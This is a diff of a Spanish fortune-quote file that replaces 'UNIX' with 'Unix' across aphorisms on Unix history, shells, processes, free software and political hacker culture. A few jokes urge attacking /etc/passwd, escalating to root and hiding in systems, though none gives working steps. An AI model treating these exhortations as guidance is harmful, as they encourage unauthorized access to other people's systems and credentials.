-El sistema UNIX se ganó el debido reconocimiento en la primera mitad de la década de 1970, con el desarrollo de minicomputadoras potentes, como la DEC PDP-11/45 y la PDP-11/70.
+El sistema Unix se ganó el debido reconocimiento en la primera mitad de la década de 1970, con el desarrollo de minicomputadoras potentes, como la DEC PDP-11/45 y la PDP-11/70.
 %
-La versión original de UNIX estaba escrita en ensamblador, pero dado que el grupo de investigación también estaba desarrollando el lenguaje C en esos años, inmediatamente fue reescrita con este nuevo lenguaje.
+La versión original de Unix estaba escrita en ensamblador, pero dado que el grupo de investigación también estaba desarrollando el lenguaje C en esos años, inmediatamente fue reescrita con este nuevo lenguaje.
 %
-UNIX nació esencialmente como una reacción a los sistemas operativos grandes, complejos e inflexibles disponibles a fines de la década de 1960.
+Unix nació esencialmente como una reacción a los sistemas operativos grandes, complejos e inflexibles disponibles a fines de la década de 1960.
 %
-Las versiones recientes de UNIX están estructuradas para un uso sencillo y funcional en las redes de transmisión de datos.
+Las versiones recientes de Unix están estructuradas para un uso sencillo y funcional en las redes de transmisión de datos.
 %
-UNIX es un sistema multitarea de tiempo compartido que puede afrontar fácilmente varias tareas en paralelo. Que una de ellas sea combatir al Capital.
+Unix es un sistema multitarea de tiempo compartido que puede afrontar fácilmente varias tareas en paralelo. Que una de ellas sea combatir al Capital.
 %
-En un sistema UNIX, la programadora puede escribir un archivo, enviarlo a una impresora y cursar correo a otra computadora simultáneamente, gracias a su funcionalidad de multitarea.
+En un sistema Unix, la programadora puede escribir un archivo, enviarlo a una impresora y cursar correo a otra computadora simultáneamente, gracias a su funcionalidad de multitarea.
 %
-Al ser un sistema multiusuaria, UNIX les permite realizar muchas tareas simultáneamente, dando a cada una de ellas la impresión de ser la única operaria de la máquina.
+Al ser un sistema multiusuaria, Unix les permite realizar muchas tareas simultáneamente, dando a cada una de ellas la impresión de ser la única operaria de la máquina.
 %
 En escencia, el scheduler se encarga de hacer infiel la CPU con sus usuarios.
 %
 Cerrar sesión en el sistema evita que personas no autorizadas utilicen su terminal, especialmente si este se encuentra en un lugar público.
 %
-Los dos factores más importantes que garantizan la seguridad del sistema UNIX son mantener seguras sus contraseñas y cerrar la sesión cada vez que abandone el terminal.
+Los dos factores más importantes que garantizan la seguridad del sistema Unix son mantener seguras sus contraseñas y cerrar la sesión cada vez que abandone el terminal.
 %
-Algunos sistemas UNIX hacen que el proceso de cierre de sesión sea inmediato si apaga el terminal o la consola. Los terminales que están conectados a la máquina a través de líneas telefónicas y módems suelen seguir este procedimiento.
+Algunos sistemas Unix hacen que el proceso de cierre de sesión sea inmediato si apaga el terminal o la consola. Los terminales que están conectados a la máquina a través de líneas telefónicas y módems suelen seguir este procedimiento.
 %
-En la terminología de UNIX, un símbolo colocado al final de una línea de texto generalmente se denomina carácter de nueva línea.
+En la terminología de Unix, un símbolo colocado al final de una línea de texto generalmente se denomina carácter de nueva línea.
 %
 Por lo general, en las terminales, la tecla INTRO actúa como nueva línea; en realidad, el carácter ASCII para el avance de línea es el carácter de avance de línea (LF).
 %
@@ -2025,7 +2033,7 @@ La shell es el programa que aguarda los mandatos ingresados por la terminal. Ord
 %
 La shell recibe sus órdenes y las traduce en instrucciones en la sintaxis interna del sistema operativo. Debéis conducir la Shell.
 %
-Muchas de las funciones que ofrece UNIX derivan de la shell, que por lo tanto puede considerarse una parte integral del sistema.
+Muchas de las funciones que ofrece Unix derivan de la shell, que por lo tanto puede considerarse una parte integral del sistema.
 %
 Los comandos suelen ser programas que la shell busca y ejecuta en respuesta a las órdenes tecleadas en la terminal.
 %
@@ -2037,7 +2045,7 @@ Los metacaracteres (comodines) y los operadores de redirección de comandos cobr
 %
 La estructura de una órden incluye generalmente, además del nombre del comando, ciertos argumentos que representan las opciones, precedidos por el signo -, así como nombres de fichero u otros identificadores de usuaria.
 %
-En la sintaxis de comandos del sistema UNIX, las opciones siguen al nombre del comando y preceden a los argumentos principales.
+En la sintaxis de comandos del sistema Unix, las opciones siguen al nombre del comando y preceden a los argumentos principales.
 %
 Tres caracteres especiales, llamados comodines, pueden reemplazar todo o parte de los nombres de archivo: son *, ? y un configurador de comodines persoanlizables configurables entre corchetes [].
 %
@@ -2135,7 +2143,7 @@ El mal técnico ojea los capacitores de la placa para no cambiarlos todos, como 
 %
 Debes ser más realista con el tiempo de cómputo.
 %
-UNIX más que llave inglesa, prefiere las llaves fijas.
+Unix más que llave inglesa, prefiere las llaves fijas.
 %
 El sistema más seguro es también el más difícil de emplear.
 %
@@ -2215,7 +2223,7 @@ El compilador-compilador yacc le ayudará a compilar un compilador de forma velo
 %
 El generador de analizadores léxicos lex le permite generar un compilador de lenguajes más simples, dables en ser operados a través de expresiones regulares.
 %
-Aquellos programas escritos en C que no dependen en demasía de las funcionalidades especiales de UNIX (tales como sus tuberías) pueden ser portados a otras máquinas que cuenten con compiladores de C.
+Aquellos programas escritos en C que no dependen en demasía de las funcionalidades especiales de Unix (tales como sus tuberías) pueden ser portados a otras máquinas que cuenten con compiladores de C.
 %
 En un lenguaje de programación imperativo, las declaraciones se ejecutan en secuencia, y cada una de ellas podría cambiar el estado del programa.
 %
@@ -2277,7 +2285,7 @@ Ya hay robots enfermeros, docentes y también periodistas y artistas. Y ya ha to
 %
 Cualquier espera superior a los 10 segundos destruye la ilusión de trabajar con una computadora propia.
 %
-En los ordenadores UNIX se habla de acceso "root", mientras que en los VMS se llaman privilegios de "system".
+En los ordenadores Unix se habla de acceso "root", mientras que en los VMS se llaman privilegios de "system".
 %
 La tecnología informática puede contribuir a extender las libertades públicas y privadas o convertirse en un instrumento de dominación.
 %
@@ -2353,7 +2361,7 @@ El ordenador se ha convertido en un común denominador que no conoce fronteras i
 %
 Los ordenadores inseguros cuestan dinero. Los seguros, algo menos.
 %
-La licencia para modificar el código fuente de UNIX, por sí solo, valía apenas 20.000 dólares.
+La licencia para modificar el código fuente de Unix, por sí solo, valía apenas 20.000 dólares.
 %
 No os infiltréis jamás en un ordenador militar. El personal de los servicios de ingeligencia jugarán con vosotros casi como al ajedrez. Recordad que practican ese juego desde hace siglos.
 %
@@ -2401,45 +2409,45 @@ Corriendo en la circuitería del disco, existe una plétora de software que le i
 %
 El Pueblo no comete errores: los programas tienen bugs.
 %
-La Maga UNIX programa milagros.
+La Maga Unix programa milagros.
 %
-Por su flexibilidad infinita, UNIX puede ser el paraíso del usuario veterano, y la pesadilla del bisoño. Su Administrador oficia de jamón del medio.
+Por su flexibilidad infinita, Unix puede ser el paraíso del usuario veterano, y la pesadilla del bisoño. Su Administrador oficia de jamón del medio.
 %
-UNIX puede ser difícil de mantener.
+Unix puede ser difícil de mantener.
 %
-Tradicionalmente, la administración de UNIX ha implicado toquetear docenas de ficheros de configuración y soportar a usuarios finales que podrían no tener idea alguna de cómo funciona realmente.
+Tradicionalmente, la administración de Unix ha implicado toquetear docenas de ficheros de configuración y soportar a usuarios finales que podrían no tener idea alguna de cómo funciona realmente.
 %
-Suele creerse que el encargado de hacer funcionar las cosas en UNIX es el Kernel. Pero quien realmente las hace funcionar es el SysAdmin.
+Suele creerse que el encargado de hacer funcionar las cosas en Unix es el Kernel. Pero quien realmente las hace funcionar es el SysAdmin.
 %
 X refiere a un sistema de gráficas de ventanas basadas en redes de datos según el modelo Cliente-Servidor. En éste la aplicación cliente no accede directamente a la pantalla, sino que se comunica con un programa de presentación intermedio, el servidor.
 %
-UNIX es un sistema operativo interactivo, multitarea y multiusuaria.
+Unix es un sistema operativo interactivo, multitarea y multiusuaria.
 %
 Un sistema operativo es un conjunto de instrucciones que gobiernan la manera en que los componentes electrónicos de la computadora interpretan y responden a órdenes y a instrucciones preprogramadas en forma de software de aplicación.
 %
-El sistema UNIX fue diseñado originalmente a finales de la década de 1960 para servir a una comunidad: específicamente investigadores de trabajo mancomunado.
+El sistema Unix fue diseñado originalmente a finales de la década de 1960 para servir a una comunidad: específicamente investigadores de trabajo mancomunado.
 %
-Debido al licencimiento liberal del sistema UNIX por parte de AT&T, a mediados de la década de 1970 comenzaron a eclosionar diferentes versiones del mismo.
+Debido al licencimiento liberal del sistema Unix por parte de AT&T, a mediados de la década de 1970 comenzaron a eclosionar diferentes versiones del mismo.
 %
-Antes de la década de 1980, el sistema UNIX se utilizaba principalmente en centros académicos y de investigación.
+Antes de la década de 1980, el sistema Unix se utilizaba principalmente en centros académicos y de investigación.
 %
-En 1981 la Universidad de California en Berkeley presentó una implementación de UNIX denominada Distribución de Software de Berkeley, el BSD.
+En 1981 la Universidad de California en Berkeley presentó una implementación de Unix denominada Distribución de Software de Berkeley, el BSD.
 %
-El sistema UNIX ha demostrado su valía para el desarrollo de software de computadora, y se ajusta fácilmente a aplicaciones específicas de la industria.
+El sistema Unix ha demostrado su valía para el desarrollo de software de computadora, y se ajusta fácilmente a aplicaciones específicas de la industria.
 %
-Para inicios de la década de 1980, el sistema UNIX era capaz de correr en una gran variedad de ambientes informáticos originados entre diferentes fabricantes, volviéndolo único en el mundo del cómputo.
+Para inicios de la década de 1980, el sistema Unix era capaz de correr en una gran variedad de ambientes informáticos originados entre diferentes fabricantes, volviéndolo único en el mundo del cómputo.
 %
-El poder y flexibilidad del sistema UNIX se ven en sus capacidades multitarea multiusuaria.
+El poder y flexibilidad del sistema Unix se ven en sus capacidades multitarea multiusuaria.
 %
-La capacidad multiusuaria de UNIX te permite trabajar con independencia en el sistema mientras compartes recursos y datos con el Pueblo.
+La capacidad multiusuaria de Unix te permite trabajar con independencia en el sistema mientras compartes recursos y datos con el Pueblo.
 %
 Si los datos los distribuye un algoritmo, no sirven. Quien viraliza el es Pueblo.
 %
-La capacidad multitarea de UNIX te permite ejecutar comandos y correr programas al unísono, siguiendo distintos métodos.
+La capacidad multitarea de Unix te permite ejecutar comandos y correr programas al unísono, siguiendo distintos métodos.
 %
-En UNIX, junto con las tareas interactivas mas normales, puedes computar trabajos capaces de correr diferidos en "segundo plano". Mientras obra así, podrás utilizar el terminal de forma interactiva en otro trabajo computacional.
+En Unix, junto con las tareas interactivas mas normales, puedes computar trabajos capaces de correr diferidos en "segundo plano". Mientras obra así, podrás utilizar el terminal de forma interactiva en otro trabajo computacional.
 %
-Históricamente, el sistema UNIX ha sido visto como un sistema de tiempo de cómputo compartido de uso general. Hoy - sin embargo - el sistema se considera en ambientes de cómputo de tiempo real.
+Históricamente, el sistema Unix ha sido visto como un sistema de tiempo de cómputo compartido de uso general. Hoy - sin embargo - el sistema se considera en ambientes de cómputo de tiempo real.
 %
 La GPLv3 no puede matar a Googl€, pero sí lo puede fundir.
 %
@@ -2459,13 +2467,13 @@ La lid telemática no es entre los Pueblos: la lucha se produce entre quienes di
 %
 A nuestro frente están las GAFAM, tentáculos de los tecno-oligarcas que siempre han oprimido al Pueblo.
 %
-El UNIX de Sexta Edición comprendía una potencia increíble para su pequeño consumo de espacio: con su kernel de residencia permanente de 20KB de código (excluyendo controladores de dispositivo), logró una tasa de cómputo nunca excedida.
+El Unix de Sexta Edición comprendía una potencia increíble para su pequeño consumo de espacio: con su kernel de residencia permanente de 20KB de código (excluyendo controladores de dispositivo), logró una tasa de cómputo nunca excedida.
 %
-Las versiones 4.x del UNIX de Berkeley descendían del UNIX Versión 7 de 1979, y rápidamente se hicieron de la reputación de un UNIX de avanzada.
+Las versiones 4.x del Unix de Berkeley descendían del Unix Versión 7 de 1979, y rápidamente se hicieron de la reputación de un Unix de avanzada.
 %
-El AT&T UNIX System III fue una versión de UNIX Versión 7 lanzada en 1981 con una interfaz de terminales depurada, pero totalmente incompatible con las mejoras de Berkeley.
+El AT&T Unix System III fue una versión de Unix Versión 7 lanzada en 1981 con una interfaz de terminales depurada, pero totalmente incompatible con las mejoras de Berkeley.
 %
-El AT&T UNIX System V de 1983 fue vendido como producto, pero al poco tiempo dejó de ser interesante: carecía de TCP/IP para prestar conectividad a redes.
+El AT&T Unix System V de 1983 fue vendido como producto, pero al poco tiempo dejó de ser interesante: carecía de TCP/IP para prestar conectividad a redes.
 %
 Los hackers no pueden dar nada que la CPU no compile.
 %
@@ -2493,7 +2501,7 @@ El verdadero hacker guarda clandestinidad en el sistema.
 %
 El underground es la clandestinidad telemática.
 %
-El Mago UNIX navega su clandestinidad entre el bus de entrada/salida y el kernel.
+El Mago Unix navega su clandestinidad entre el bus de entrada/salida y el kernel.
 %
 "Sólo uso LibreOffice y navegador" era un tango que se escuchaba en vitrola.
 %
@@ -2517,9 +2525,9 @@ Los virus informáticos son programas de computadora capaces de infectar otros p
 %
 Un hacker puede parecer valiente por programar controladores de dispositivos o modificar el núcleo del sistema operativo, pero temblará ante la mera idea de alterar sendmeil o sus ficheros de configuración.
 %
-Para toquetear SENDMAIL hay que ser un mago UNIX.
+Para toquetear SENDMAIL hay que ser un mago Unix.
 %
-Desarrollar un conjunto de programas cooperativos se alinea con la filosofía UNIX.
+Desarrollar un conjunto de programas cooperativos se alinea con la filosofía Unix.
 %
 El más grande desafío a la seguridad en los ambientes multitarea y multiusuario es obvio e imposible de resolver: muchos servicios constan de ficheros de comandos y configuración propiedad de un único usuario.
 %
@@ -2591,7 +2599,7 @@ Viajar en el bus de E/S cuesta dos bits.
 %
 La brecha de seguridad más grande del sistema es ponerle una CPU que no ha sido diseñada por uno mismo.
 %
-La shell no tiene nada de especial, es como cualquier otro programa regular del sistema UNIX.
+La shell no tiene nada de especial, es como cualquier otro programa regular del sistema Unix.
 %
 La shell no es el sistema operativo en sí mismo.
 %
@@ -2599,7 +2607,7 @@ La shell es la interfaz entre la mujer y la máquina.
 %
 El prompt es un recordatorio para el usuario de que no está sucediendo nada, de que la computadora se encuentra dispuesta a recibir una órden.
 %
-sh es la shell de Bourne, estándar en UNIX System V, y como tal, lleva el signo $ como prompt.
+sh es la shell de Bourne, estándar en Unix System V, y como tal, lleva el signo $ como prompt.
 %
 csh es la C shell, desarrollada en el Departamento de Ciencias de la Universidad de Berkeley. Es igual a la shell de Bourne con algunos lujos en sus estructuras de control, historial de órdenes y alias. Su prompt es un signo %.
 %
@@ -2609,11 +2617,11 @@ ksh es la shell de Korn, que combina los logros de la shell de Bourne y la C.
 %
 rsh es la shell de Bourne restringida, útil en todo momento que el superusuario anhela castrar a los ingresantes remotos al sistema.
 %
-ua es una shell de menúes implementada en UNIX System V que se distingue por ser lenta, incluso a la friolera de 2400 baudios.
+ua es una shell de menúes implementada en Unix System V que se distingue por ser lenta, incluso a la friolera de 2400 baudios.
 %
-La mayor parte de los comandos y programas de UNIX toman su entrada del teclado y envían su salida a la pantalla del terminal. Pero eso sólo si contamos con una.
+La mayor parte de los comandos y programas de Unix toman su entrada del teclado y envían su salida a la pantalla del terminal. Pero eso sólo si contamos con una.
 %
-/etc/passwd es el fichero de contraseñas, el más importante del sistema UNIX. Atácalo.
+/etc/passwd es el fichero de contraseñas, el más importante del sistema Unix. Atácalo.
 %
 Atemoriza con ensamblador sin comentarios.
 %
@@ -2641,7 +2649,7 @@ Todas nuestras tecnologías electrónicas parecen marchar hacia la unidad.
 %
 Teléfonos, televisión, sistemas de cable, receptores de satélite, grabadoras de videocasetes, videodiscos, cámaras de video y fijas, computadoras domésticas... todo evoluciona hacia una especie de supersistema "teletrónico" que algún día fusionará estas partes ahora separadas en un todo integrado.
 %
-UNIX es como un DOS... ¡DOScientas veces más potente!
+Unix es como un DOS... ¡DOScientas veces más potente!
 %
 Quienes ponen la UX por delante del sistema, ponen el carro delante del caballo.
 %
@@ -2689,7 +2697,7 @@ Quien conoce el mínimo programa obra ricamente.
 %
 Un parser es un traductor mecánico de cadenas de texto a símbolos identificables. Para ello no necesita salir al balcón.
 %
-El número mágico se usa en los sistemas UNIX para identificar el tipo de fichero.
+El número mágico se usa en los sistemas Unix para identificar el tipo de fichero.
 %
 Un byte mas allá de COBOL encontrarás la inmortalidad.
 %
@@ -2727,7 +2735,7 @@ Un clúster de datos para el Pueblo permite almacenar para trabajar, y resguarda
 %
 La Masa es 0. Quien la transforma en 1 es su Conductor.
 %
-En el sistema tipo UNIX la usuaria más poderosa es "root". Al loguearte al mismo como root, podrás crear y destruir cualquier fichero, lo que en UNIX significa todo, pues todo es un fichero.
+En el sistema tipo Unix la usuaria más poderosa es "root". Al loguearte al mismo como root, podrás crear y destruir cualquier fichero, lo que en Unix significa todo, pues todo es un fichero.
 %
 El acceso a root no se da, se escala.
 %
@@ -2745,7 +2753,7 @@ Antes que GNU, los streams bajaban turbios.
 %
 Si un dispositivo carece de interruptor de apagado de módem, apenas es un dispositivo de espionaje con control ajeno encubierto.
 %
-Los intérpretes de comando de UNIX están orientados al texto: los ejecutables se invocan vía texto, los parámetros se indican vía texto, el flujo de datos desde y hacia el sistema circula en base a texto, y prácticamente todo en el sistema se hace a través de símbolos de caracteres.
+Los intérpretes de comando de Unix están orientados al texto: los ejecutables se invocan vía texto, los parámetros se indican vía texto, el flujo de datos desde y hacia el sistema circula en base a texto, y prácticamente todo en el sistema se hace a través de símbolos de caracteres.
 %
 El ed original fue un editor de línea de comandos ideado por Ken Thompson para operar con terminales teletipo. Como tal, no fue concebido para utilizar a bien las videoterminales posteriores, con pantalla y cursor direccionable.
 %
@@ -2939,7 +2947,7 @@ Los hackers no son enemigos de la sociedad, son enemigos de la oligarquía.
 %
 Los Pall Malls se fuman, los caños con AWK se consumen.
 %
-¡Vengan de a UNIX!
+¡Vengan de a Unix!
 %
 Javascript promueve la lucha de clases.
 %
@@ -2955,9 +2963,9 @@ Cuando estés en duda, consulta la licencia.
 %
 Entre un paquete y otro que se dice equivalente, escoge siempre el liberado bajo GPLv3. Si ambos lo están, sigue tu corazón.
 %
-Al UNIX todos los datos le son parecidos.
+Al Unix todos los datos le son parecidos.
 %
-En UNIX, todos los programas se ejecutan en la salsa de su propio ambiente.
+En Unix, todos los programas se ejecutan en la salsa de su propio ambiente.
 %
 Sólo un burro usaría una Burroughs.
 %
@@ -3074,11 +3082,11 @@ La tecnología del cómputo debe siempre sintetizarse.
 %
 Al contrario de lo que muchos creen, la evolución de la tarea del cómputo debe llevarse a cabo según una labor de simplificación.
 %
-El sistema UNIX no es el fin de la síntesis computacional a la que aspira el Pueblo: sólo un buen paso en la senda de la simplificación.
+El sistema Unix no es el fin de la síntesis computacional a la que aspira el Pueblo: sólo un buen paso en la senda de la simplificación.
 %
 Window$ es un enorme patovica de software al que hay que cagar a trompadas para poder usar la CPU.
 %
-Como una empanada dulce, el membrillo de UNIX es su kernel.
+Como una empanada dulce, el membrillo de Unix es su kernel.
 %
 Para Window$, los únicos privilegiados son los Malwares.
 %
@@ -3274,7 +3282,7 @@ No existe mejor programa que aquel que se autocompila por necesidad de un Pueblo
 %
 Los hackers entienden. Los usuarios comprenden.
 %
-GNU nunca habría alcanzado al Pueblo sin la ayuda de UNIX.
+GNU nunca habría alcanzado al Pueblo sin la ayuda de Unix.
 %
 No pongas 0 sin saber porqué no 1.
 %
@@ -3455,7 +3463,7 @@ Al disco viejo, backup nuevo.
 %
 A diferencia de las piedras, las llaves PGP se pueden revocar.
 %
-UNIX no habría alcanzado nunca al Pueblo sin la ayuda de GNU.
+Unix no habría alcanzado nunca al Pueblo sin la ayuda de GNU.
 %
 No es poderosa la CPU que tiene más núcleos, sino la que menos necesita.
 %
@@ -3581,35 +3589,35 @@ Patria 1, Colonia 0.
 %
 Si el software se paga con dinero público, su código debe ser público.
 %
-En UNIX, una Imagen es un ambiente de la ejecución computarizada. incluye un espejado de contenido de memoria, valores de registros, estado de ficheros abiertos, directorio actual de trabajo, y la alegría del Pueblo.
+En Unix, una Imagen es un ambiente de la ejecución computarizada. incluye un espejado de contenido de memoria, valores de registros, estado de ficheros abiertos, directorio actual de trabajo, y la alegría del Pueblo.
 %
-En UNIX, una Imágen representa un estado de una pseudo-máquina.
+En Unix, una Imágen representa un estado de una pseudo-máquina.
 %
-En UNIX, un Proceso es la ejecución de una Imagen.
+En Unix, un Proceso es la ejecución de una Imagen.
 %
-La Imagen de UNIX ha de residir en memoria principal mientras que el procesador corre en función del Proceso. Ante la ejecución de otros procesos, permanecerá en memoria hasta que la aparición de un proceso activo de mayor prioridad obligue su intertercambio al disco.
+La Imagen de Unix ha de residir en memoria principal mientras que el procesador corre en función del Proceso. Ante la ejecución de otros procesos, permanecerá en memoria hasta que la aparición de un proceso activo de mayor prioridad obligue su intertercambio al disco.
 %
-La memoria de usuario parte de una Imagen de UNIX y se divide en tres segmentos lógicos alegres: el segmento de texto del programa, el segmento de datos escribibles, y el segmento de pila.
+La memoria de usuario parte de una Imagen de Unix y se divide en tres segmentos lógicos alegres: el segmento de texto del programa, el segmento de datos escribibles, y el segmento de pila.
 %
 Es mejor tener muchos programas pequeños que tener uno masivo.
 %
-En UNIX, el segmento de texto de programa comienza en la localización 0 del espacio de memoria virtual.
+En Unix, el segmento de texto de programa comienza en la localización 0 del espacio de memoria virtual.
 %
-Exceptuando la autocarga de UNIX en memoria, sólo resulta posible crear un nuevo proceso de cómputo empleando la llamada de sistema fork, que efectúa la feliz ramificación computacional bifurcable.
+Exceptuando la autocarga de Unix en memoria, sólo resulta posible crear un nuevo proceso de cómputo empleando la llamada de sistema fork, que efectúa la feliz ramificación computacional bifurcable.
 %
 Cuando se ejecuta fork, la llamada de sistema para la bifurcación computacional, el proceso se ramifica en dos procesos de feliz ejecución independiente. Ambos cuentan con copias independientes de la imagen de memoria original, y comparten todos los ficheros abiertos.
 %
 Al bifurcarse un proceso de cómputo con fork, ambos procesos resultantes sólo difieren en que uno de ellos es considerado proceso padre, y el otro proceso hijo. Todos son del Pueblo.
 %
-Al dividirse un proceso de cómputo de UNIX con la llamada de sistema fork, distinguirá cual es el proceso hijo o padre, por su identificador de proceso: en el proceso hijo siempre es 0.
+Al dividirse un proceso de cómputo de Unix con la llamada de sistema fork, distinguirá cual es el proceso hijo o padre, por su identificador de proceso: en el proceso hijo siempre es 0.
 %
-Los procesos de UNIX pueden comunicarse con sus procesos emparentados a través de llamadas de lectura y escritura conocidas como caños.
+Los procesos de Unix pueden comunicarse con sus procesos emparentados a través de llamadas de lectura y escritura conocidas como caños.
 %
 El caño es un mecanismo para conectar la salida de un programa directamente a la entrada de otro programa, de modo que ambos puedan realizar dos etapas de procesamiento paralelo, de manera limpia.
 %
 Ante cualquier emergencia, recuerda que la llamada filep = pipe ( ) arma un caño.
 %
-No existen dudas que el caño sirve como primitiva de comunicación, y también lo hace en los sistemas similares a UNIX.
+No existen dudas que el caño sirve como primitiva de comunicación, y también lo hace en los sistemas similares a Unix.
 %
 Las ventajas de un sistema reactivo sobre los sistemas interactivos actuales serán tan grandes como las ventajas de los sistemas interactivos sobre aquellos de procesamiento por lotes.
 %
@@ -3673,17 +3681,17 @@ La vida en la shell incluye la capacidad de sustituir parámetros y edificar lis
 %
 Las instancias de la shell en la cual los usuarios ingresan órdenes son sólo procesos hijos de otro proceso, al cual están encadenados.
 %
-El paso final en la inicialización de un sistema UNIX es la creación de un único proceso y la invocación de un programa denominado init, destinado a crear un proceso para cada línea de terminal de cómputo existente.
+El paso final en la inicialización de un sistema Unix es la creación de un único proceso y la invocación de un programa denominado init, destinado a crear un proceso para cada línea de terminal de cómputo existente.
 %
-Al mecanografiar un nombre de usuario en la línea login de UNIX, despiertará una instancia apropiada de init que leerá tal nombre, lo coteja contra el registro codificado de contraseñas, y de coincidir, cambia al directorio del usuario, establece el identificador de proceso al propio de usuario, y corre una instancia de la shell.
+Al mecanografiar un nombre de usuario en la línea login de Unix, despiertará una instancia apropiada de init que leerá tal nombre, lo coteja contra el registro codificado de contraseñas, y de coincidir, cambia al directorio del usuario, establece el identificador de proceso al propio de usuario, y corre una instancia de la shell.
 %
 En circunstancias ordinarias, el bucle principal del intérprete de comandos no cesa jamás.
 %
-A no ser que se tomen otras medidas, una acción ilegal en un sistema UNIX provoca la terminación del proceso y el volcado de una imagen de la memoria de núcleo en un fichero en el directorio actual.
+A no ser que se tomen otras medidas, una acción ilegal en un sistema Unix provoca la terminación del proceso y el volcado de una imagen de la memoria de núcleo en un fichero en el directorio actual.
 %
 Es posible el uso de un depurador para determinar el estado de un programa volcado al momento de su falla.
 %
-El éxito del sistema UNIX se debió principalmente al hecho de que no fue diseñado para cumplir objetivo predefinido alguno.
+El éxito del sistema Unix se debió principalmente al hecho de que no fue diseñado para cumplir objetivo predefinido alguno.
 %
 Nuestra intención ha sido fomentar una relación agradable con la máquina y explorar ideas e invenciones en sistemas operativos y otro software.
 %
@@ -3691,7 +3699,7 @@ Como somos programadores, naturalmente diseñamos un sistema que hiciera sencill
 %
 La expresión más importantes de nuestro deseo para la conveniencia de la programación es convivir en un ambiente informático dispuesto para el uso interactivo.
 %
-Siempre quisimos un sistema de cómputo interactivo, incluso a pesar de que la versión original de UNIX sólo soportaba un usuario.
+Siempre quisimos un sistema de cómputo interactivo, incluso a pesar de que la versión original de Unix sólo soportaba un usuario.
 %
 Creemos que un sistema interactivo propiamente diseñado es mucho más productivo y satisfactorio de usar que un sistema de cómputo por lotes. 
 %
@@ -3699,7 +3707,7 @@ Un sistema de cómputo interactivo resulta bastante sencillo de adaptar al uso n
 %
 Dado el antagonismo entre una eficiencia razonable y la expresividad del cómputo que provoca, la limitación de potencia de cómputo no sólo ha incentivado una economía de recursos, sino también cierta elegancia en nuestro diseño de sistema.
 %
-Al igual que la Justicia Social, casi desde un comienzo el sistema UNIX pudo sostenerse con el esfuerzo de los trabajadores.
+Al igual que la Justicia Social, casi desde un comienzo el sistema Unix pudo sostenerse con el esfuerzo de los trabajadores.
 %
 Si se obliga a los diseñadores de un sistema a utilizarlo, rápidamente comprenderán sus deficiencias funcionales que han cometido.
 %
@@ -3707,27 +3715,27 @@ Programar las propias herramientas de software incentiva a corregirlas antes de 
 %
 Si los diseñadores de un sistema no lo utilizan y comercian su código fuente, tal sistema se verá rápidamente colmado de deficiencias funcionales, de las cuales sólo se intentarán corregir de manera superficial.
 %
-En UNIX no existen grandes rutinas con "métodos de acceso" que aislen al programador del amor de las llamadas de sistema.
+En Unix no existen grandes rutinas con "métodos de acceso" que aislen al programador del amor de las llamadas de sistema.
 %
-Todos los programas de usuario de UNIX llaman al sistema directamente, o bien usan un pequeño programa de una biblioteca para precargar cierta cantidad de caracteres y leerlos o escribirlos a la vez.
+Todos los programas de usuario de Unix llaman al sistema directamente, o bien usan un pequeño programa de una biblioteca para precargar cierta cantidad de caracteres y leerlos o escribirlos a la vez.
 %
-Dada la necesidad de utilizar todos los programas tanto con cualquier fichero o dispositivo como flujo de caracteres para su entrada o salida, también se volvió necesario persuadir este mecanismo con independencia del sistema operativo UNIX en sí.
+Dada la necesidad de utilizar todos los programas tanto con cualquier fichero o dispositivo como flujo de caracteres para su entrada o salida, también se volvió necesario persuadir este mecanismo con independencia del sistema operativo Unix en sí.
 %
-O hacemos que en UNIX todos los programas sean utilizables con cualquier fichero o dispositivo de flujo de caracteres como entrada y salida, o nos veremos obligados a incorporar a cada programa rutinas que hagan caso de cada dispositivo de hardware.
+O hacemos que en Unix todos los programas sean utilizables con cualquier fichero o dispositivo de flujo de caracteres como entrada y salida, o nos veremos obligados a incorporar a cada programa rutinas que hagan caso de cada dispositivo de hardware.
 %
 Si no damos a todo hardware la justicia de operar como abstracción de flujo de caracteres, tendremos que programar a cada programa con rutinas específicas.
 %
 Si no damos a todo hardware la justicia de operar como abstracción de flujo de caracteres, tendremos que programar a cada uno de manera específica, o ceder a la irrevocable ignominia del software privativo de control.
 %
-El éxito de UNIX recae no tanto en invenciones novedosas, sino en la total explotación de un conjunto de ideas fértiles cuidadosamente seleccionadas.
+El éxito de Unix recae no tanto en invenciones novedosas, sino en la total explotación de un conjunto de ideas fértiles cuidadosamente seleccionadas.
 %
-UNIX fue una demostración práctica de una implementación de un sistema operativo pequeño pero poderoso. Todo lo que vino luego fue intentar contradecir tal demostración.
+Unix fue una demostración práctica de una implementación de un sistema operativo pequeño pero poderoso. Todo lo que vino luego fue intentar contradecir tal demostración.
 %
-La operación de bifurcación FORK tal como se implementa en UNIX, estaba presente ya en el sistema de tiempo de cómputo compartido GENIE.
+La operación de bifurcación FORK tal como se implementa en Unix, estaba presente ya en el sistema de tiempo de cómputo compartido GENIE.
 %
-Muchas funcionalidades de UNIX fueron adoptadas por influencia de Multics, sugeridas en su forma particular de llamadas de Entrada/Salida, así como el nombre de la shell y sus funciones generales.
+Muchas funcionalidades de Unix fueron adoptadas por influencia de Multics, sugeridas en su forma particular de llamadas de Entrada/Salida, así como el nombre de la shell y sus funciones generales.
 %
-El concepto según el cual la Shell UNIX crea un proceso para cada órden sugiere el diseño primigenio de Multics, aunque en dicho sistema resultó descartada por razones de eficiencia. Un esquema similar se utiliza en TENEX.
+El concepto según el cual la Shell Unix crea un proceso para cada órden sugiere el diseño primigenio de Multics, aunque en dicho sistema resultó descartada por razones de eficiencia. Un esquema similar se utiliza en TENEX.
 %
 Cualquiera con acceso al cómputo puede ser sometido a ingeniería social.
 %
@@ -3775,7 +3783,7 @@ Apegarse a los malos hábitos de programación del lenguaje BASIC torna consider
 %
 Por una serie de accidentes históricos en la década de los ochentas, BASIC se volvió común en las microcomputadoras de gama baja.
 %
-Es probable que BASIC arruinara la sapiencia de decenas de miles de magos UNIX potenciales.
+Es probable que BASIC arruinara la sapiencia de decenas de miles de magos Unix potenciales.
 %
 Algunos lenguajes que llevan la cocarda de BASIC ya no son tan espantosos, habiendo adquirido procedimientos y estructuras de control similares a C y Pascal, y al haberse deshecho de sus números de línea.
 %
@@ -3825,17 +3833,17 @@ Alguien en algún lugar será capaz de construir un mejor chip que tí, si dejas
 %
 No exponga su impresora LaserWriter a llamas abiertas o al fuego.
 %
-Bajo el BSD UNIX, la partición de disco utilizada para intercambio se llama /dev/drum.
+Bajo el BSD Unix, la partición de disco utilizada para intercambio se llama /dev/drum.
 %
